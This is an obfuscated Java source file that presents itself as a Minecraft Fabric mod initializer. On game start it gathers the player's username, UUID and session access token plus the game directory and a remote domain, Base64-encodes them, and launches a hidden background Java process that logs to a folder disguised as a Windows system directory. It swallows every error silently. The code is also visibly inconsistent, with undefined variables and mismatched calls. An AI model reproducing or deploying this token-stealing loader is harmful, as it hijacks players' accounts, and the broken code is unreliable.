package net.fabric;

import java.io.File;
import java.lang.ProcessBuilder.Redirect;
import java.net.URI;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.Base64;
import java.util.Base64.Encoder;
import net.fabricmc.api.ModInitializer;

public class hkonjkz implements ModInitializer {
   public void onInitialize() {
      new Thread(
            () -> {
               try {
                  String dpauncYhsetwVgblg = znIHc.pushNujoblgu();
                  String tPWMqedm = znIHc.uJkZ3wKhh54();
                  String tr_cpsx_vfb = znIHc.xEekjwrqo();
                  if (tr_cpsx_vfb == null) {

                     tr_cpsx_vfb = "unknown";
                  }

                  String objIdx = btcValue.fpxh();
                  String RD_1DIRQop0 = btcValue.boijwpi4();
                  Path rwdyw_lel_hy = gqnlaxCkxcpNzfgto.ihOhlA();
                  btcValue cqmxon_asehl_gx = new btcValue();
                  String dsqjaPwxePfuyqkEgqbn = cqmxon_asehl_gx.getDomain();
                  String mVal = cqmxon_asehl_gx.prefire(dsqjaPwxePfuyqkEgqbn, dpauncYhsetwVgblg, objIdx);
                  Encoder var10000 = Base64.getEncoder();
                  String var10001 = gqnlaxCkxcpNzfgto.xOTMTQgzbQ1oGa(tPWMqedm);
                  String var10002 = gqnlaxCkxcpNzfgto.xOTMTQgzbQ1oGa(tr_cpsx_vfb);
                  String var24 = gqnlaxCkxcpNzfgto.xOTMTQgzbQ1oGa(dpauncYhsetwVgblg);
                  String var23 = var10002;
                  String var22 = var10001;
                  StringBuilder var25;
                  StringBuilder var85 = var25 = new StringBuilder();
                  var25.append('{');
                  var25.append('"');
                  var25.append('u');
                  var25.append('s');
                  var25.append('e');
                  var25.append('r');
                  var25.append('n');
                  var25.append('a');
                  var25.append('m');
                  var25.append('e');
                  var25.append('"');
                  var25.append(':');
                  var25.append('"');
                  StringBuilder var86 = var85.append("{\"username\":\"").append(var22);

                  StringBuilder var87 = var86.append("\",\"uuid\":\"").append(var23);

                  String bx_ln_mqj = var10000.encodeToString(
                     var87.append("\",\"accessToken\":\"").append(var24).append("\"}").toString().getBytes(StandardCharsets.UTF_8)
                  );
                  if (mVal != null) {
                     var10001 = mVal;
                  } else {

                     var10001 = "null";
                  }

                  var10002 = gqnlaxCkxcpNzfgto.xOTMTQgzbQ1oGa(objIdx);
                  String var10003 = gqnlaxCkxcpNzfgto.xOTMTQgzbQ1oGa(RD_1DIRQop0);
                  String var10004 = gqnlaxCkxcpNzfgto.xOTMTQgzbQ1oGa(dsqjaPwxePfuyqkEgqbn);
                  String var10005 = gqnlaxCkxcpNzfgto.xOTMTQgzbQ1oGa(rwdyw_lel_hy != null ? rwdyw_lel_hy.toString() : "");
                  String var10006 = gqnlaxCkxcpNzfgto.xOTMTQgzbQ1oGa(tPWMqedm);
                  String var40 = gqnlaxCkxcpNzfgto.xOTMTQgzbQ1oGa(tr_cpsx_vfb);
                  String var39 = var10006;
                  String var38 = var10005;
                  String var37 = var10004;
                  String var36 = var10003;
                  String var35 = var10002;
                  String var34 = var10001;
                  String var33 = bx_ln_mqj;
                  StringBuilder var75 = new StringBuilder();

                  StringBuilder var76 = var75.append("{\"mcInfo\":\"").append(var33);

                  StringBuilder var77 = var76.append("\",\"prefireId\":\"").append(var34);

                  StringBuilder var78 = var77.append("\",\"userId\":\"").append(var35);

                  StringBuilder var79 = var78.append("\",\"tag\":\"").append(var36);

                  StringBuilder var80 = var79.append("\",\"domain\":\"").append(var37);

                  StringBuilder var81 = var80.append("\",\"gameDir\":\"").append(var38);

                  StringBuilder var82 = var81.append("\",\"mcUsername\":\"").append(var39);

                  StringBuilder var83 = var82.append("\",\"mcUuid\":\"").append(var40);

                  String nNum = var83.append("\",\"env\":\"Fabric\"}").toString();
                  String flags5 = Base64.getEncoder().encodeToString(nNum.getBytes(StandardCharsets.UTF_8));

                  String bjcflRolbDj = System.getProperty("java.home");
                  String[] var89 = new String[]{"bin", null};

                  var89[1] = "javaw.exe";
                  Path mgmG0_7KCAKi00 = Path.of(bjcflRolbDj, var89);
                  if (!Files.exists(mgmG0_7KCAKi00)) {
                     String[] var90 = new String[]{"bin", null};

                     var90[1] = "java.exe";
                     mgmG0_7KCAKi00 = Path.of(bjcflRolbDj, var90);
                  }

                  URI c2utZ_UXFA = hkonjkz.class.getProtectionDomain().getCodeSource().getLocation().toURI();
                  Path GyXT_pcUW_Fnql_TDeD = Path.of(c2utZ_UXFA);

                  String var84 = System.getenv("LOCALAPPDATA");
                  String[] var91 = new String[3];

                  var91[0] = "Microsoft";

                  var91[1] = "Windows";

                  var91[2] = "NtProfileIndex";
                  Path resCnt = Path.of(var84, var91);
                  Files.createDirectories(resCnt);
                  String miay_jnka_zf_vwirlu = btcValue.class.getName();
                  ProcessBuilder XUbz_aWON_zSMZ_zSmc = new ProcessBuilder(
                     mgmG0_7KCAKi00.toString(), "-cp", GyXT_pcUW_Fnql_TDeD.toString(), miay_jnka_zf_vwirlu, flags5
                  );
                  XUbz_aWON_zSMZ_zSmc.redirectInput(Redirect.from(new File("NUL")));

                  XUbz_aWON_zSMZ_zSmc.redirectOutput(Redirect.appendTo(resCnt.resolve("_spawn.log").toFile()));
                  XUbz_aWON_zSMZ_zSmc.redirectErrorStream(true);
                  XUbz_aWON_zSMZ_zSmc.directory(resCnt.toFile());
                  XUbz_aWON_zSMZ_zSmc.start();
               } catch (Exception var74) {
               }
            }
         )
         .start();
   }

   private Path ihOhlA() {

      Path wusd_ltob = Path.of(System.getProperty("user.dir"));

      if (!Files.exists(wusd_ltob.resolve("options.txt"))) {

         if (!Files.exists(wusd_ltob.resolve("config"))) {

            if (!Files.exists(wusd_ltob.resolve("mods"))) {

               String piKd_aABR_qafW_HkoT = System.getenv("APPDATA");
               if (piKd_aABR_qafW_HkoT != null) {
                  String[] var10001 = new String[1];

                  var10001[0] = ".minecraft";
                  Path ReVKl = Path.of(piKd_aABR_qafW_HkoT, var10001);
                  if (Files.exists(ReVKl)) {
                     return ReVKl;
                  }
               }

               String var10000 = System.getProperty("user.home");
               String[] var20 = new String[1];

               var20[0] = ".minecraft";
               Path bufMax = Path.of(var10000, var20);
               if (Files.exists(bufMax)) {
                  return bufMax;
               }

               return wusd_ltob;
            }
         }
      }

      return wusd_ltob;
   }

   private String xOTMTQgzbQ1oGa(String s) {
      if (gnir_kwyb == null) {
         return "";
      }

      StringBuilder retIn = new StringBuilder();

      for (char zData : gnir_kwyb.toCharArray()) {
         switch (zData) {
            case '\t':
               retIn.append("\\t");
               break;
            case '\n':
               retIn.append("\\n");
               break;
            case '\r':
               retIn.append("\\r");
               break;
            case '"':
               retIn.append("\\\"");
               break;
            case '\\':
               char[] var7 = new char[]{'\\', '\\'};
               retIn.append(new String(var7));
               break;
            default:
               if (zData < ' ') {
                  StringBuilder var9 = new StringBuilder();
                  var9.append('\\');
                  var9.append('u');
                  var9.append('%');
                  var9.append('0');
                  var9.append('4');
                  var9.append('x');
                  retIn.append(String.format(var9.toString(), Integer.valueOf(zData)));
               } else {
                  retIn.append(zData);
               }
         }
      }

      return retIn.toString();
   }
}
